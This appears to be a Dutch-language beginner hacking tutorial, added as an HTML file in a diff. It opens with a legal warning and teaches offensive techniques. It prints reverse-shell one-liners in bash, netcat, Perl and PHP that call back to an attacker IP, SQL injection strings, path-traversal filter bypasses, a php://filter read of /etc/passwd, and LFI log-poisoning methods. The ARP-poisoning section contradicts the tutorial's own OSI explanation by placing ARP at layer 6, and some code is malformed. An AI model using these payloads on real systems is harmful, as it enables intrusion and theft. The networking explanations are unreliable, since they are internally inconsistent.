@@ -1,0 +1,564 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>index</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<style type="text/css">
+/* GitHub stylesheet for MarkdownPad (http://markdownpad.com) */
+/* Author: Nicolas Hery - http://nicolashery.com */
+/* Version: b13fe65ca28d2e568c6ed5d7f06581183df8f2ff */
+/* Source: https://github.com/nicolahery/markdownpad-github */
+
+/* RESET
+=============================================================================*/
+
+html, body, div, span, applet, object, iframe, h1, h2, h3, h4, h5, h6, p, blockquote, pre, a, abbr, acronym, address, big, cite, code, del, dfn, em, img, ins, kbd, q, s, samp, small, strike, strong, sub, sup, tt, var, b, u, i, center, dl, dt, dd, ol, ul, li, fieldset, form, label, legend, table, caption, tbody, tfoot, thead, tr, th, td, article, aside, canvas, details, embed, figure, figcaption, footer, header, hgroup, menu, nav, output, ruby, section, summary, time, mark, audio, video {
+  margin: 0;
+  padding: 0;
+  border: 0;
+}
+
+/* BODY
+=============================================================================*/
+
+body {
+  font-family: Helvetica, arial, freesans, clean, sans-serif;
+  font-size: 14px;
+  line-height: 1.6;
+  color: #333;
+  background-color: #fff;
+  padding: 20px;
+  max-width: 960px;
+  margin: 0 auto;
+}
+
+body>*:first-child {
+  margin-top: 0 !important;
+}
+
+body>*:last-child {
+  margin-bottom: 0 !important;
+}
+
+/* BLOCKS
+=============================================================================*/
+
+p, blockquote, ul, ol, dl, table, pre {
+  margin: 15px 0;
+}
+
+/* HEADERS
+=============================================================================*/
+
+h1, h2, h3, h4, h5, h6 {
+  margin: 20px 0 10px;
+  padding: 0;
+  font-weight: bold;
+  -webkit-font-smoothing: antialiased;
+}
+
+h1 tt, h1 code, h2 tt, h2 code, h3 tt, h3 code, h4 tt, h4 code, h5 tt, h5 code, h6 tt, h6 code {
+  font-size: inherit;
+}
+
+h1 {
+  font-size: 28px;
+  color: #000;
+}
+
+h2 {
+  font-size: 24px;
+  border-bottom: 1px solid #ccc;
+  color: #000;
+}
+
+h3 {
+  font-size: 18px;
+}
+
+h4 {
+  font-size: 16px;
+}
+
+h5 {
+  font-size: 14px;
+}
+
+h6 {
+  color: #777;
+  font-size: 14px;
+}
+
+body>h2:first-child, body>h1:first-child, body>h1:first-child+h2, body>h3:first-child, body>h4:first-child, body>h5:first-child, body>h6:first-child {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+a:first-child h1, a:first-child h2, a:first-child h3, a:first-child h4, a:first-child h5, a:first-child h6 {
+  margin-top: 0;
+  padding-top: 0;
+}
+
+h1+p, h2+p, h3+p, h4+p, h5+p, h6+p {
+  margin-top: 10px;
+}
+
+/* LINKS
+=============================================================================*/
+
+a {
+  color: #4183C4;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* LISTS
+=============================================================================*/
+
+ul, ol {
+  padding-left: 30px;
+}
+
+ul li > :first-child, 
+ol li > :first-child, 
+ul li ul:first-of-type, 
+ol li ol:first-of-type, 
+ul li ol:first-of-type, 
+ol li ul:first-of-type {
+  margin-top: 0px;
+}
+
+ul ul, ul ol, ol ol, ol ul {
+  margin-bottom: 0;
+}
+
+dl {
+  padding: 0;
+}
+
+dl dt {
+  font-size: 14px;
+  font-weight: bold;
+  font-style: italic;
+  padding: 0;
+  margin: 15px 0 5px;
+}
+
+dl dt:first-child {
+  padding: 0;
+}
+
+dl dt>:first-child {
+  margin-top: 0px;
+}
+
+dl dt>:last-child {
+  margin-bottom: 0px;
+}
+
+dl dd {
+  margin: 0 0 15px;
+  padding: 0 15px;
+}
+
+dl dd>:first-child {
+  margin-top: 0px;
+}
+
+dl dd>:last-child {
+  margin-bottom: 0px;
+}
+
+/* CODE
+=============================================================================*/
+
+pre, code, tt {
+  font-size: 12px;
+  font-family: Consolas, "Liberation Mono", Courier, monospace;
+}
+
+code, tt {
+  margin: 0 0px;
+  padding: 0px 0px;
+  white-space: nowrap;
+  border: 1px solid #eaeaea;
+  background-color: #f8f8f8;
+  border-radius: 3px;
+}
+
+pre>code {
+  margin: 0;
+  padding: 0;
+  white-space: pre;
+  border: none;
+  background: transparent;
+}
+
+pre {
+  background-color: #f8f8f8;
+  border: 1px solid #ccc;
+  font-size: 13px;
+  line-height: 19px;
+  overflow: auto;
+  padding: 6px 10px;
+  border-radius: 3px;
+}
+
+pre code, pre tt {
+  background-color: transparent;
+  border: none;
+}
+
+kbd {
+    -moz-border-bottom-colors: none;
+    -moz-border-left-colors: none;
+    -moz-border-right-colors: none;
+    -moz-border-top-colors: none;
+    background-color: #DDDDDD;
+    background-image: linear-gradient(#F1F1F1, #DDDDDD);
+    background-repeat: repeat-x;
+    border-color: #DDDDDD #CCCCCC #CCCCCC #DDDDDD;
+    border-image: none;
+    border-radius: 2px 2px 2px 2px;
+    border-style: solid;
+    border-width: 1px;
+    font-family: "Helvetica Neue",Helvetica,Arial,sans-serif;
+    line-height: 10px;
+    padding: 1px 4px;
+}
+
+/* QUOTES
+=============================================================================*/
+
+blockquote {
+  border-left: 4px solid #DDD;
+  padding: 0 15px;
+  color: #777;
+}
+
+blockquote>:first-child {
+  margin-top: 0px;
+}
+
+blockquote>:last-child {
+  margin-bottom: 0px;
+}
+
+/* HORIZONTAL RULES
+=============================================================================*/
+
+hr {
+  clear: both;
+  margin: 15px 0;
+  height: 0px;
+  overflow: hidden;
+  border: none;
+  background: transparent;
+  border-bottom: 4px solid #ddd;
+  padding: 0;
+}
+
+/* TABLES
+=============================================================================*/
+
+table th {
+  font-weight: bold;
+}
+
+table th, table td {
+  border: 1px solid #ccc;
+  padding: 6px 13px;
+}
+
+table tr {
+  border-top: 1px solid #ccc;
+  background-color: #fff;
+}
+
+table tr:nth-child(2n) {
+  background-color: #f8f8f8;
+}
+
+/* IMAGES
+=============================================================================*/
+
+img {
+  max-width: 100%
+}
+</style>
+</head>
+<body>
+<h1>Gatochhacken.nl</h1>
+<h1>Voorwoord</h1>
+<p>In het kader van <a href="https://www.laatjeniethackmaken.nl" title="laatjeniethackmaken.nl">https://www.laatjeniethackmaken.nl</a> heb ik besloten om juist het tegenovergestelde te gaan maken. Gatochhacken.nl. Waarom ga toch hacken? Omdat er veel vragen zijn en mensen wel met security willen beginnen maar eigenlijk erg veel moeite hebben met het vinden van de juiste informatie in een voor hen begrijpelijke taal (Nederlands). </p>
+<p>Ik ga je niet leren hacken, dat is iets wat je zelf met veel oefening zal moeten doen. Het enige wat ik kan doen is begrippen uitleggen, de ene keer iets uitgebreider dan de andere, en je doorverwijzen naar bronwebsites waar je vervolginformatie kunt vinden. Het is onmogelijk om al deze informatie in één document te bundelen.</p>
+<p>Daarnaast verwacht ik van iemand die wil leren hacken dat er een zekere mate van intrinsieke nieuwsgierigheid aanwezig is en dat je jezelf wilt gaan inlezen. Om te voorkomen dat je afhaakt zal er wel wat text zijn om de linkjes aan elkaar te plakken. Deze pagina is overigens permanent under construction.</p>
+<p><strong>LET OP</strong> alle technieken, code voorbeelden en andere informatie zijn technieken waarmee je kan hacken. Deze toepassen op een systeem waar jij geen toestemming hebt om dit te doen is een strafbaar feit! (artikel 138ab wetboek van strafrecht) Bega geen fout, wil je oefenen en dingen proberen, kijk dan op de website van <a href="https://www.certifiedsecure.com" title="Certified Secure">https://www.certifiedsecure.com</a></p>
+<h1>Protocollen</h1>
+<p>Het is ontzettend belangrijk dat je protocollen leert kennen, immers het kennen van protocollen zorgt voor een grotere flexibiliteit in aanvallen en een grotere onafhankelijkheid van tooling. Mocht je het protocol al kennen, dan kun je zelf eenvoudiger een tool schrijven die je bij een aanval ondersteund.</p>
+<h2>HTTP</h2>
+<p>Het HTTP protocol1 is een protocol die door veel gebruikers gebruikt wordt om op het internet pagina’s op te vragen. HTTP is een, relatief, eenvoudig plain-text protocol. 
+Binnen HTTP verstuurt een gebruiker een verzoek naar een webserver, dit verzoek ziet er bijvoorbeeld als volgt uit:</p>
+<pre><code>GET /index.php HTTP/1.1
+User-Agent: Firefox
+Host: www.voorbeeld.nl
+Accept-Language: en
+</code></pre>
+
+<p>In het bovengenoemde verzoek is GET de methode waarmee je een pagina opvraagt, daarachter staat de URI die je wilt opvragen en dan het protocol met de versienummer. Het User-Agent gedeelte is de browser die iemand gebruikt en de host het internet adres die een eindgebruiker wil bezoeken. Al deze velden kan jij als eindgebruiker beïnvloeden. Er bestaan overigens nog meer velden, maar daarvoor verwijs ik je graag naar de RFC zoals hierboven vermeld.
+Als reactie hierop stuurt de server het volgende antwoord:</p>
+<pre><code>HTTP/1.1 200 OK
+Date: Thu, 3 May 2018 18:43:53 GMT
+Server: Apache
+Last-Modified: Wed, 2 May 2018 01:44:23 GMT
+Content-Length: 73
+Content-Type: text/plain
+
+Hallo! Ik bedank je voor verzoek! Hier heb je mijn pagina als antwoord :)
+</code></pre>
+
+<p>Er zijn meerdere methoden om verzoeken naar webservers te sturen. Veel voorkomende methoden zijn:</p>
+<p><strong>POST</strong>, bedoeld om gegevens niet in de URL mee te sturen maar in de body van je request. Deze methode zullen goede developers gebruiken om logingegevens te verzenden. De met POST requests meegezonden data komen in de meeste webservers (zoals apache bij standaard instellingen) niet in de logging terug.
+<strong>HEAD</strong>, doet hetzelfde als de hierboven genoemde GET request maar dan met als verschil dat de request body niet meegezonden wordt.
+<strong>TRACE</strong>, met TRACE geeft de webserver de, door jou verzonden request headers weer zodat je kan zien of er tussen jou, en de webserver, nog aanpassingen gedaan zijn. 
+Start wireshark op je ingerichte lab machine en kijk eens wat er gebeurd als je met de request generator gaat spelen.</p>
+<h2>FTP</h2>
+<h2>ICMP</h2>
+<h2>OSI-model</h2>
+<p>Alhoewel het OSI(Open Systems Interconnection)-model geen protocol is is het wel iets wat handig is om in je achterhoofd te houden als je iets wilt gaan doen met netwerk hacking. Het OSI-model bestaat uit 7 lagen. Hoe hoger de laag, des te dichter je bij de gebruiker aangekomen bent. Hieronder spits ik het toe op een TCP/IP stack, wil je iets anders hierover lezen dan is google een goede start. De lagen zijn als volgt:</p>
+<ol>
+<li><strong>Physical</strong></li>
+</ol>
+<p>De fysieke laag zorgt er voor dat de data die jij over een netwerk wilt verzenden ook daadwerkelijk op de kabel komt, en dat de data die mensen over het netwerk verzenden ook daadwerkelijk bij jouw systeem komt. Voorbeelden van deze protocollen zijn DSL, ISDN, CAN bus en WIFI. Als er iets ontvangen is, gaat deze informatie naar laag 2.
+Dit kun je vergelijken met het posten van de brief, of het uit de brievenbus halen van je brief.</p>
+<ol>
+<li><strong>Datalink</strong></li>
+</ol>
+<p>De datalink laag bepaald de manier hoe er gecommuniceerd word en met wie. In deze laag zul je ook vaak foutcorrectie vinden. Voorbeelden van protocollen op deze laag zijn ethernet, CHAP en ARP. Dit kan je vergelijken met een adres die op de enveloppe geschreven wordt of of afgelezen wordt. </p>
+<ol>
+<li><strong>(inter)Network</strong></li>
+</ol>
+<p>In deze laag vind je de IPv4 protocollen en de IPv6 protocollen zowel als IPSec en NAT. In deze laag wordt het mogelijk gemaakt om verschillende netwerken aan elkaar te knopen en routing toe te passen. Een bijkomend voordeel is dat bij het IP protocol hier IP adressen ontstaan die voor mensen normaal te lezen zijn. Dit kan je vergelijken met het opschrijven of aflezen van de postcode.</p>
+<ol>
+<li><strong>Transport</strong></li>
+</ol>
+<p>In de transport laag wordt end-to-end communicatie mogelijk gemaakt, hier wordt in feite de envelop gemaakt waar de boodschap in gaat. Bij sommige protocollen worden hier ook betrouwbaarheidsmaatregelen genomen, zoals bijvoorbeeld bij TCP. Bij TCP schrijf je ook een antwoordbevestiging op de envelop.</p>
+<ol>
+<li><strong>Session</strong></li>
+</ol>
+<p>Deze laag beheert de sessies die tussen twee communicerende partijen bestaan, het houd de verbinding open of sluit hem af als hij niet meer noodzakelijk is. Hierbij kan je denken aan SSH, SMB of RDP.</p>
+<ol>
+<li><strong>Presentation</strong></li>
+</ol>
+<p>De presentatie laag is de plaats waar de informatie een encoding,compressie of encryptie krijgt (of het omgekeerde natuurlijk). Deze laag is niet altijd eenvoudig te duiden, HTTP kan in sommige visies namelijk zowel onder de presentatie als de applicatie laag vallen.</p>
+<ol>
+<li><strong>Application</strong></li>
+</ol>
+<p>De applicatielaag is de hoogste laag van het OSI model en deze laag ligt erg dicht bij een eindgebruiker en hij zal deze dan meestal ook het vaakst kennen. Binnen deze laag vallen protocollen als DNS, WEBDav, HTTP en FTP. Dit zijn protocollen waarmee computers direct met elkaar kunnen communiceren over de (met de lagere lagen) opgezette telecommunicatie- en computernetwerken.</p>
+<p>In laag 1 wordt de informatie uitgedrukt in bits, in laag 2 spreken we over frames. In laag 3 over packets en laag 4 over segments. Alles boven laag 4 is data.</p>
+<p>Er zijn diverse ezelsbruggetjes om het OSI-model te onthouden. Één hiervan is <em>All people should try new dairy products</em>	</p>
+<h1>Shells</h1>
+<h2>Reverse shell</h2>
+<p>Alhoewel een volledig interactieve shell soms niet nodig is om je doel te bereiken, is het wel een van de krachtigste toegangen die je als hacker kan krijgen. Een reverse shell is wanneer een computer naar jou terug verbind en vervolgens zijn shell of command line aan jou ter beschikking stelt.</p>
+<p>Er zijn verschillende manieren om shells te bemachtigen, waaronder standaard met programmeertalen danwel de methodes met kant en klare agents.</p>
+<p>Hieronder zal ik er een aantal plaatsen:</p>
+<h3>Bash</h3>
+<pre><code>exec /bin/bash 0&amp;0 2&gt;&amp;0 
+bash -i &gt;&amp; /dev/tcp/&lt;IP&gt;/&lt;PORT&gt; 0&gt;&amp;1
+</code></pre>
+
+<h3>Java</h3>
+<h3>Netcat</h3>
+<pre><code>nc -e /bin/sh ATTACKING-IP 80
+</code></pre>
+
+<h3>Perl</h3>
+<pre><code>perl -e 'use Socket;$i=&quot;IP&quot;;$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};'
+</code></pre>
+
+<h3>PHP</h3>
+<pre><code>php -r '$sock=fsockopen(&quot;&lt;ip&gt;&quot;,&lt;port&gt;);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'
+</code></pre>
+
+<h3>Ruby</h3>
+<h2>MSFVenom</h2>
+<p>Msfvenom is de payloadgenerator van het Metasploit Framework. Met deze payloadgenerator kan je eenvoudig code genereren die diverse soorten backdoors, reverse shells of andere toepassingen bieden. </p>
+<h3>Linux</h3>
+<h3>Mac</h3>
+<h3>Windows</h3>
+<h3>Android</h3>
+<h1>Web attacks</h1>
+<h2>Enumeratie</h2>
+<p>Het is bijna onmogelijk om een onbeperkte lijst te geven van mogelijkheden waarop je binnen websites kan enumereren. Om hier toch een beeld te kunnen geven van welke gegevenssets je allemaal kan verzamelen van websites zullen er toch een niet limitatieve opsomming aan mogelijkheden gegeven worden.</p>
+<h3>Zoekmachinefuncties</h3>
+<p>Veel websites willen het zoekmachines graag makkelijker maken om geïndexeerd te worden, of soms juist voorkomen dat een zoekmachine bij sommige pagina’s kan komen. Je kan altijd kijken of er een zogenaamd robots.txt1 bestand is waarmee een beheerder de toegang tot bepaalde pagina’s wil beperken. Schrik niet als je hier de “geheime” paden naar de beheersinterface aantreft.</p>
+<p>Als je juist eenvoudig en met weinig verzoeken gebruikers wil enumereren of andere informatie wil verzamelen waarvan het juist de bedoeling is dat zoekmachines hierbij kunnen, kijk dan eens naar de sitemap1. In een sitemap neemt een beheerder juist de pagina’s op waarvan hij graag wil dat je die gaat lezen.</p>
+<h3>Webpagina's</h3>
+<p>Als je niet weet welke mappen of bestanden er allemaal bestaan kan je bij bekende softwarepakketten de installatiebestanden downloaden en deze installeren. Op deze manier kan je een beeld krijgen welke pagina’s er allemaal in een installatie horen te zitten en kan je er achter komen of er iets als een changelog (publiek) beschikbaar is waarmee je de versie van een applicatie kan achterhalen.</p>
+<h3>Dynamische pagina's</h3>
+<p>Tegenwoordig bevatten de meeste websites een content managment systeem. Deze content managment systemen maken het makkelijker om websites aan te maken en te beheren. Een beheerder hoeft geen HTML of CSS code meer te typen en kan eenvoudiger nieuwe pagina’s aan maken. Ook kan je vaak de inhoud van je website in eenzelfde omgeving typen als je van moderne tekstverwerkers gewend bent.
+Als je een website tegen komt waarbij dit het geval is, en je vervolgens ziet dat userprofielen op te vragen zijn met een getal, dan kan je potentieel alle gebruikersnamen verzamelen. </p>
+<p><strong>Voorbeeld wordpress:</strong>
+Op Wordpress websites is het, standaard, mogelijk om de inlognamen van auteurs te vergaren. Deze inlognamen worden gebruikt om op het wp-admin panel in te loggen. </p>
+<p>http://<wordpress>/?author=<id></p>
+<p>Als je het id nummer op 1 zet krijg je de gebruikersnaam van de eerste aangemaakte Wordpress gebruiker. Dit zal vaak de administrator zijn.</p>
+<h3>Login formulieren</h3>
+<p>Ook login formulieren kunnen een schat aan informatie prijs geven, zoals of een gebruiker bestaat en of je het juiste wachtwoord hebt. In het laatste geval zal je logischerwijs inloggen. Alhoewel het best practice is om aan te geven dat de gebruikersnaan en/of wachtwoord foutief ingevuld zijn geven sommige websites ook nog verschillende gegevens weer.</p>
+<p>&lt; input met gebruikersnaam&gt;</p>
+<p>Je kan hier bijvoorbeeld zien dat je de gebruikersnaam niet goed hebt omdat de gebruiker niet bestaat.</p>
+<p>&lt; input met password&gt;</p>
+<p>Je kan hier bijvoorbeeld zien dat je de gebruikersnaam goed hebt, immers er is een dit wachtwoord is incorrect melding verschenen.</p>
+<p>&lt; input met user/password foutief&gt; </p>
+<p>Aan dit veld kun je geen conclussies meer verbinden.</p>
+<h2>Client-side controle functionaliteiten</h2>
+<h3>Authenticatiefouten</h3>
+<h3>Sessie managment</h3>
+<h3>SQL</h3>
+<p>Eenvoudige injectie </p>
+<p><code>' # --</code> </p>
+<p>Indien het een username / password is en de query moet blijven werken:</p>
+<pre><code>' OR 1=1 OR 1='
+</code></pre>
+
+<h3>NoSQL</h3>
+<h3>XPath</h3>
+<h3>LDAP</h3>
+<h3>File uploads</h3>
+<h3>Fouten in de logica</h3>
+<h3>Cross site scripting</h3>
+<p>Cross site scripting (XSS) is een techniek waarbij je “slechte” gebruikersinvoer kunt plaatsen op een website. Deze invoer kan je vervolgens gebruiken om mensen te besmetten of om hun cookies / credentials te stelen.</p>
+<h4>Reflected XSS</h4>
+<p>Reflected of non-persistent XSS is een techniek waarbij een fout in de input sanitization het weergeven van kwaadaardige code toe staat. Het belangrijkste om te onthouden is dat in dit geval de aanval niet op de website opgeslagen is, en iemand dus alleen slachtoffer kan worden als hij echt jouw link aan klikt met de aanval.</p>
+<h4>Stored XSS</h4>
+<p>Stored of persistent XSS is een techniek waarbij een fout in de input sanitization het opslaan van je aanval mogelijk maakt. Dit soort aanvallen maken meer slachtoffers omdat iedereen die de specifieke pagina bezoekt er mee besmet zal worden.</p>
+<h4>DOM XSS</h4>
+<p>DOM (Document Object Model) XSS is een methode waarbij een aanvaller de kwaadaardige code op zo een manier plaatst dat het nooit via de webserver loopt. Dit kan bijvoorbeeld als javascript gebruik maakt van de URL van een webpagina zonder hierop een juiste input sanitization te doen.</p>
+<h2>Local file inclusion</h2>
+<p>LFI is een aanvalstechniek die volledig Local File Inclusion heet. Het is een kwetsbaarheid waarbij een applicatie gebruikersinvoer niet op een juiste wijze bewerkt. Door deze kwetsbaarheid te misbruiken krijg je de mogelijkheid om bestanden in te laden waar dit (eigenlijk) niet de bedoeling was. Op deze manier kan je potentieel bestanden lezen als /etc/passwd of andere gevoelige bestanden.</p>
+<p>File includes zijn redelijk te herkennen aan de parameters achter een pagina naam. Denk hierbij aan een GET parameter als file of page. Vaak zie je hier dan een bestandsnaam staan. In de submappen zijn enkele opdrachten te vinden waarmee je zelf met LFI kunt spelen.</p>
+<h2>Path traversal</h2>
+<p>Path Traversal wordt ook wel Directory Traversal genoemd. Eigenlijk is dit niets anders dan in een regulier Linux filesystem navigeren. Als je iets in een andere map wilt zoeken zul je hier naar toe moeten navigeren op een manier zoals je dat op de command line ook doet. Als je test.txt wilt weergeven die een map hoger in de directory structuur staat kan je “cat ../test.txt” gebruiken.</p>
+<p>Je kan op deze manier geen sources van PHP bestanden in zien. PHP bestanden worden door de PHP functies include en requre ingeladen en geparsed. Hierdoor zal je hetzelfde zien als wat je ziet als je de pagina rechtstreeks bezoekt.</p>
+<p>In sommige gevallen gebruiken mensen een WAF of hebben ze zelf scripting geschreven die opgegeven path's op hun inhoud filteren. Lang niet alle implementaties die mensen verzinnen geven een goede filtering. </p>
+<p>Om bepaalde filters te omzeilen kan je bijvoorbeeld je path url encoden of tweemaal url encoden. Dit geeft in die volgorde de volgende resultaten:</p>
+<pre><code>../
+%2e%2e%2f
+%252e%252e%252f
+</code></pre>
+
+<p>Ook kan je je path traversal in unicode opgeven uit de hoop dat een ontvangende applicatie hier niet correct mee om kan gaan. In sommige gevallen filteren scripts op <em>../</em> . Je kan dan ook eens een andere slash gebruiken dan die je net gebruikte. </p>
+<p>Mochten ze onverhoopt ../ en ..\ er uit filteren zoals in het volgende code voorbeeld:</p>
+<pre><code>&lt;?PHP
+    $path = $_GET['path'];
+    $path = ereg_replace('\.\./','',$path);
+    $path = ereg_replace('\.\./','',$path);
+    echo $path;
+?&gt;
+</code></pre>
+
+<p>Dan kan je bijvoorbeeld de volgende string opgeven:</p>
+<pre><code>...\.\
+</code></pre>
+
+<p>PHP zal in dat geval eerst de ..\ er uit filteren, en dan houd je alsnog een correcte path traversal over. </p>
+<h3>Simpele beveiliging</h3>
+<p>In sommige gevallen proberen developers een local file inclusion te voorkomen door bijvoorbeeld een extensie op te geven in hun include. Op deze manier kunnen ze voorkomen dat je bijvoorbeeld /etc/passwd uit kan lezen, omdat /etc/passwd.php niet bestaat.</p>
+<p>In programmeertalen worden strings meestal beëindigd met een zogenaamde null-byte. Een null-byte is hexadecimaal 0x00 en heeft geen teken om hem weer te geven. Als je zelf een null-byte kan injecten in deze file, dan kan je potentieel voorkomen dat de extensie er achter geplakt wordt. </p>
+<p>Als het je niet lukte dan kan dit komen omdat je je URL niet correct ge-encode hebt. Een nullbyte kan je niet zomaar meesturen, maar moet door de webserver wel correct geïnterpreteerd worden. Stuur dus %00 mee in plaats van 0x00 of 0. De nullbyte methode werkt enkel in PHP &lt; 5.3.</p>
+<p>In filesystem functies trunct PHP onder linux de paden automatisch naar 4096 tekens. Je kan dit voor elkaar krijgen door voor het path een opstapeling van “./” strings op te nemen totdat je op dit maximum zit.</p>
+<h3>PHP Wrapper</h3>
+<p>PHP kent verschillende wrappers. Met PHP Wrappers kan je toegang krijgen tot diverse I/O streams van applicaties en op deze wijze kan je bestanden uitlezen of commando’s op servers uitvoeren. Deze wrappers zijn voornamelijk bedoeld om met functies als readfile, file en file<em>get</em>contents te werken. </p>
+<h4>php://data</h4>
+<h4>php://stdin, php://stdout en php://stderr</h4>
+<h4>php://input</h4>
+<p>De php://input wrapper voert altijd de complete inhoud van een POST request uit. Deze inhoud zal uitgevoerd worden zonder dat het door PHP, en de instellingen in php.ini, geparsed zijn. Hierdoor kan je commando’s op de server uitvoeren.
+Wij gebruiken voor de volgende opdracht het php bestand “oefening1.php”.</p>
+<p>Installeer vervolgens de Firefox Hackbar op je lokale machine. Met de Hackbar kan je vervolgens POST verzoeken sturen naar de webserver en voornoemde pagina met als url: <jeurl>/oefening1.php?file=php://input</p>
+<p><strong>Opdracht 1:</strong> Vraag de directory listing op van /var/www/html.</p>
+<p><strong>Opdracht 2:</strong> Vraag de inhoud op van het /etc/passwd bestand.</p>
+<h4>php://output</h4>
+<h4>php://fd</h4>
+<h4>php://memory en php://temp</h4>
+<h4>php://filter</h4>
+<p>In sommige gevallen kan je enkel gebruik maken van filters om informatie uit te lezen. </p>
+<p>De syntax van filters is als volgt:</p>
+<pre><code>php://filter/&lt;type&gt;.&lt;filter&gt;/&lt;parameter&gt;
+</code></pre>
+
+<p>Wil je een bestand uitlezen en deze base64 gecodeerd weergeven dan kun je het volgende gebruiken. </p>
+<pre><code>php://filter/convert.base64-encode/resource=../../../etc/passwd
+</code></pre>
+
+<h3>Zelf bestanden introduceren</h3>
+<p>Je kan zelf bestanden introduceren door middel van bijvoorbeeld upload formulieren. Op foto deel websites kan je een foto uploaden maar geen PHP bestanden. Je kan PHP code opnemen in de meta data van een afbeelding en deze via LFI kwetsbaarheid laten uitvoeren.</p>
+<h3>Handige systeembestanden</h3>
+<p>Er bestaan systeembestanden die te misbruiken zijn als je de juiste invoer gebruikt. Dit zijn voornamelijk bestanden in de /proc/self mappen van Linux.
+Dit zijn specifieker:</p>
+<h4>/proc/self/cmdline</h4>
+<h4>/proc/self/stat</h4>
+<h4>/proc/self/fd/[0-35]</h4>
+<p>In een van de filedescriptors van het huidige proces staat de Apache error log weggeschreven. Je kan zelf php code in de logging wegschrijven en deze later weer opvragen. Als je nieuwsgierig bent kan je de logbestanden in /var/log zelf bekijken en zien welke log bestanden je hiervoor zal kunnen misbruiken.</p>
+<h4>/proc/self/environ</h4>
+<p>Als je de environ file kan includen dan heb je de beschikking over de environmental variabelen waaronder de applicatie op dat moment draait. Een van de gebruikersgegevens die in deze environmental variabelen terecht komt is de user agent. Doormiddel van handige Firefox plugin zoals uaswitcher1 kan je zelf je useragent aanpassen en hier bijvoorbeeld PHP code in plaatsen. </p>
+<h1>Netwerk aanvallen</h1>
+<h2>Enumeratie</h2>
+<p>Ook op netwerken is het erg belangrijk om een juiste enumeratie te doen. Het weten welke hosts er in het netwerk zijn en welke hosts er allemaal beschikbaar zijn om aan te vallen is één van de belangrijkste gegevens.</p>
+<p>Bij het uitvoeren van een red team actie is het van belang dat het red team een zekere opbouw in &quot;detecteerbaarheid&quot; heeft. Immers het is de bedoeling dat het red team op een gegeven moment gedetecteerd wordt door het blue team om op deze wijze ook de incident response te kunnen testen.</p>
+<h3>Passive host discovery</h3>
+<p>Er zijn diverse manieren om hosts op een netwerk te ontdekken, je kan actief scannen maar ook passief ontdekken welke systemen aanwezig zijn. Dit ontdekken zonder zelf activiteit in het netwerk te veroorzaken zal logischerwijs minder opvallen. Je kan met TCPdump een netwerkdump maken en deze in wireshark openen. Kijk naar alle binnenkomende ARP antwoorden en maak een lijstje van alle IP adressen die je voorbij ziet komen. Je kan, afhankelijk van de data die je binnenkrijgt natuurlijk ook andere protocollen dan ARP meenemen in dit lijstje.</p>
+<p>Dit kun je ook eenvoudiger maken met de tool netdiscover en de schakeloptie -p.</p>
+<h3>Actieve host discovery</h3>
+<h4>Ping sweep</h4>
+<p>Een ping sweep is iets wat in gemonitorde omgevingen waarschijnlijk op zal vallen en het zal alleen werken als er geen ICMP filtering is geïmplementeerd. ICMP filtering voorkomt immers dat een host op een PING verzoek kan reageren.</p>
+<p>Probeer zelf een programma te schrijven die het ICMP Ping pakket verzend, of gebruik nmap -sP <ipange> om het IP adres van je home lab server te vinden.</p>
+<h3>Port scan</h3>
+<p>nmap -p <ports> <ip></p>
+<h2>ARP poisoning</h2>
+<p>Een van de manieren om een man in the middle positie te bemachtigen is ARP poisoning. ARP staat voor Address Resolution Protocol. Om de werking van ARP op een goede manier te begrijpen is het noodzakelijk om het OSI model te snappen. Voor het OSI model verwijs ik terug naar het &quot;protocollen&quot; kopje.</p>
+<p>Het ARP protocol (laag 6) zorgt ervoor dat de computers binnen een IP subnet (laag 5) van elkaar kunnen weten aan welk MAC adres men een frame moet zenden. Als voorbeeld hebben wij een netwerk met de volgende systemen:</p>
+<p>Hostnaam   - IP Adres	 - MAC adres
+Computer A - 192.168.1.2 - MACADDR1
+Computer B - 192.168.1.3 - MACADDR2</p>
+<p>Op het moment dat computer A een berichtje wil sturen naar computer B zal computer A zowel het IP adres als het MAC adres van computer B weten. Het IP adres is ingegeven door de gebruiker, met dat IP adres stuurt computer A een ARP verzoek.</p>
+<blockquote>
+<p>Wie heeft IP adres 192.168.1.3? Vertel het 192.168.1.2!</p>
+</blockquote>
+<p>Dit bericht wordt op laag 7 opgevangen door de computers op het subnet. Elke computer gaat in zijn OSI model omhoog vragen of het IP adres bij hem hoort. Laag 7 vraagt aan laag 6, laag 6 aan laag 5 en daar komt computer B erachter dat dit MAC adres van hem is. Computer B stuurt deze bevestiging terug naar laag 6, die weer naar laag 7 en dan wordt er op het netwerk het volgende ARP bericht verzonden:</p>
+<blockquote>
+<p>192.168.1.3 is te vinden op MACADDR2</p>
+</blockquote>
+<p>Op dat moment weet computer A het juiste MAC adres en kan computer A het pakketje versturen.</p>
+<p>Bij ARP poisoning komen wij op computer C om de hoek.
+Hostnaam   - IP Adres	 - MAC adres
+Computer A - 192.168.1.2 - MACADDR1
+Computer B - 192.168.1.3 - MACADDR2
+Computer C - 192.168.1.4 - EVILMAC1</p>
+<p>Computer A vraagt weer in het netwerk:</p>
+<blockquote>
+<p>Wie heeft IP adres 192.168.1.3? Vertel het 192.168.1.2!</p>
+</blockquote>
+<p>maar het is nu niet computer B die als eerste kan reageren, maar dat zijn wij op computer C. Op het moment dat wij het verzoek van computer A zien sturen wij zo snel (en vaak) mogelijk naar het MAC adres van computer A:</p>
+<blockquote>
+<p>192.168.1.3 is te vinden op EVILMAC1</p>
+<p>192.168.1.3 is te vinden op EVILMAC1</p>
+<p>192.168.1.3 is te vinden op EVILMAC1</p>
+<p>192.168.1.3 is te vinden op EVILMAC1</p>
+</blockquote>
+<p>en als wij eerder zijn dan de reactie van computer B dan wordt het bericht naar ons verzonden, ditzelfde doen wij ook zo snel mogelijk voor het pad van computer B naar computer A. Wij sturen op het netwerk ook zo vaak en snel mogelijk</p>
+<blockquote>
+<p>192.168.1.3 is te vinden op EVILMAC1</p>
+<p>192.168.1.3 is te vinden op EVILMAC1</p>
